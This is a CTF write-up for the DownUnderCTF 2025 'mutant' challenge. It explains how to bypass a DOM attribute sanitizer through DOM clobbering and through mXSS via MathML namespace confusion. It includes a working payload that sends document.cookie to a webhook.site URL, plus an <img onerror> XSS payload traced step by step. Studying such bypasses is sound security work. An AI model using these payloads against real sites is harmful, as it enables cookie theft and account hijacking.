---
author: Sat Naing
pubDatetime: 2025-07-23T15:22:00Z
modDatetime: 2025-07-13T16:52:45.934Z
title: DownUnderCTF 2025 mutant
slug: du-theme-mutate
featured: false
draft: false
tags:
  - writeup
description:
  Downunder mutant task writeup.
---

The task is a DOM attribute sanitizer that also removes all tags with length 6 and 8.

```js
// The received DOM is inserted into a <template>, likely so that the browser normalizes the data, builds missing tags, and sets quotes appropriately.
// <template> creates a shadow DOM that is not accessible from the outside. It also doesn't affect the page.
const t = document.createElement("template");
t.innerHTML = inp || '';

console.log("After injecting into template", t.innerHTML);
// Extract data from the <template>
const nodes = [t.content];
// Traverse the DOM in depth-first order
while (nodes.length > 0) {
    const n = nodes.pop();
    console.log("Parsed element", n.outerHTML || n.textContent);
    // Get the attributes of the element
    if (n.attributes) {
        // Remove each attribute from the element
        while (n.attributes.length > 0) {
            n.removeAttribute(n.attributes[0].name);
        }
    }
    // Remove the element if its name is 6 or 8 characters long
    if (n.nodeName !== "#document-fragment" && (n.nodeName.length === 6 || n.nodeName.length === 8)) {
        n.parentNode.removeChild(n);
        continue;
    }

    for (let i = n.children.length - 1; i >= 0; i--) {
        nodes.push(n.children[i]);
    }
}

console.log("After sanitization", t.innerHTML);

myoutputdebug.innerText = t.innerHTML;
myoutput.innerHTML = t.innerHTML;

console.log("Final", myoutput.innerHTML);
```

# Unintended - DOM Clobbering

```html
<form id=x tabindex=0 onfocus="window.location='//webhook.site/f0a8091f-b573-4ccf-a32d-6543a61e0423?cookie='+btoa(document.cookie)" autofocus>
  <input id=attributes>
</form>
```

By overwriting `n.attributes`, we achieve `n.attributes.length === undefined`, which prevents the following code from executing and thus doesn't clean the form's attributes:

```js
while (n.attributes.length > 0) {
    n.removeAttribute(n.attributes[0].name);
}
```

# Intended - mXSS

> If your time is valuable, stop reading now. Below is my attempt to understand how mXSS works in the context of this challenge. It’s long and, as it turns out, kind of useless.

I initially decided to take a different approach and didn’t even consider this solution, although the challenge name hinted at it.

I only saw the mXSS solution later in a write-up and wanted to analyze it.

The challenge author references [this write-up](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/) that explains this bypass. The author points out that DOM uses namespace mechanisms and that their handling, as per the spec, is quite complex.

---

We will pass the payload through our sanitizer to understand how it works.

After each code fragment, you’ll see how the browser would render the DOM. Note that during rendering, the browser normalizes the DOM and may omit or reformat tags. I’ll try to clarify these cases.

Step one: initial parsing of the root DOM.

```html
<form>
   <math>
      <mtext>
</form>
<form>
<mglyph>
<style>
</math>
<img src onerror=alert(1)>
</style>
</mglyph>
</form>
</mtext>
</math>
```

Below are several interpretations of this DOM.

1. **Browser DOM interpretation after rendering:**

```
<form> [HTML]
  <math> [MathML]
    <mtext> [MathML]
      <form> [HTML]
        <mglyph> [HTML]
          <style> [HTML]
            </math>
<img src onerror=alert(1)>
          </style> [HTML]
        </mglyph> [HTML]
      </form> [HTML]
    </mtext> [MathML]
  </math> [MathML]
</form> [HTML]
```

2. **Debug DOM output:**

```html
<form>
  <math>
    <mtext>
      <form>
        <mglyph>
          <style>
            </math><img src onerror=alert(1)>
          </style>
        </mglyph>
      </form>
    </mtext>
  </math>
</form>
```

3. **Namespace interpretation:**

```
<form> [HTML]
  <math> [MathML]
    <mtext> [MathML]
      <mglyph> [MathML]
        <style> [MathML]
        </style> [MathML]
      </mglyph> [MathML]
    </mtext> [MathML]
  </math> [MathML]
  <img src="" onerror="alert(1)"> [HTML]
</form> [HTML]
```

Sanitizer processes the first element:

`n = form`

```html
<math>
   <mtext>    
      <form>     
         <mglyph>        
            <style>
</math>
<img src onerror=alert(1)>
</style>
</mglyph>
</form>
</mtext>
</math>
```

Namespaced interpretation:

```
<math> [MathML]
  <mtext> [MathML]
    <form> [HTML]
      <mglyph> [HTML]
        <style> [HTML]
          </math>
<img src onerror=alert(1)>
        </style> [HTML]
      </mglyph> [HTML]
    </form> [HTML]
  </mtext> [MathML]
</math> [MathML]
```

Next, we remove `<math>`, removing the MathML namespace, but the closing `</math>` remains.

`n = math`

```html
<mtext>
   <form>
      <mglyph>
         <style></math><img src onerror=alert(1)></style>
      </mglyph>
   </form>
</mtext>
```

Rendered as:

```html
<mtext> [HTML]
  <form> [HTML]
    <mglyph> [HTML]
      <style> [HTML]
        </math><img src onerror=alert(1)>
      </style> [HTML]
    </mglyph> [HTML]
  </form> [HTML]
</mtext> [HTML]
```

We are now in a pure HTML namespace.

n = mtext

```html
<form>
   <mglyph>
      <style></math><img src onerror=alert(1)></style>
   </mglyph>
</form>
```

Rendered as:

```html
<form> [HTML]
  <mglyph> [HTML]
    <style> [HTML]
      </math><img src onerror=alert(1)>
    </style> [HTML]
  </mglyph> [HTML]
</form> [HTML]
```

After removing the 6-letter tag `<mglyph>`, we would get:

```html
<form>
   <math>
      <mtext></mtext>
   </math>
</form>
```

Since `<mglyph>` is removed, the payload doesn't execute. But the original research shows another tag with similar behavior.

If we replace `<mglyph>` with `<malignmark>`, which isn't filtered due to length, processing continues.

```html
<malignmark>
  <style>
    </math><img src onerror=alert(1)>
  </style>
</malignmark>
```

Rendered as:

```html
<malignmark> [HTML]
  <style> [HTML]
    </math><img src onerror=alert(1)>
  </style> [HTML]
</malignmark> [HTML]
```

Final invalid DOM:

```html
<style>
  </math><img src onerror=alert(1)>
</style>
```

Would not render:

```html
[no DOM]
```

Only this part is left after filtering:

```html
</math><img src onerror=alert(1)>
```

Which passes the sanitizer and is displayed.

### More Questions Than Answers

Unfortunately, I am far from fully understanding the original researcher’s analysis, though I tried to break down what’s happening.

Michał Bentkowski emphasizes the importance of `<malignmark>` in breaking namespace context. However, during sanitizer execution I didn’t observe anything special about it. I tested replacing it with `<div>`, and it made no difference.

Reviewing the blog again, I realized that the key is:

> So DOMPurify has nothing to do here, and returns a serialized HTML:

It’s not about the sanitizer — it’s about rendering. The browser fixes the broken DOM and renders it differently **after** all checks.

![](@/assets/images/mxss_before_render.png)

Renders as:

![](@/assets/images/mxss_after_render.png)